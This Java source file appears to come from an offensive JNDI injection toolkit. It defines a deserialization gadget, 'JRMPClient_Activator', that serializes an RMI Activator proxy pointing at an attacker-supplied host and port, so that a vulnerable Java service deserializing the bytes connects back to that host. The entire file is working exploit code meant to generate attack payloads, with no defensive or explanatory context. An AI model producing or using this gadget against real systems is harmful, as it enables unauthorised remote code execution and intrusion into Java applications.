package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.rmi.activation.Activator;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class JRMPClient_Activator {

    public static byte[] getBytes(PayloadType type) throws Exception {
        String command = String.valueOf(type);
        String host;
        int    port, sep = command.indexOf(':');
        if (sep < 0) {
            port = (new Random()).nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1)).intValue();
        }
        ObjID                         id    = new ObjID((new Random()).nextInt());
        TCPEndpoint                   te    = new TCPEndpoint(host, port);
        UnicastRef                    ref   = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj   = new RemoteObjectInvocationHandler(ref);
        Activator                     proxy = (Activator) Proxy.newProxyInstance(JRMPClient_Activator.class.getClassLoader(), new Class[]{Activator.class}, obj);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(proxy);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
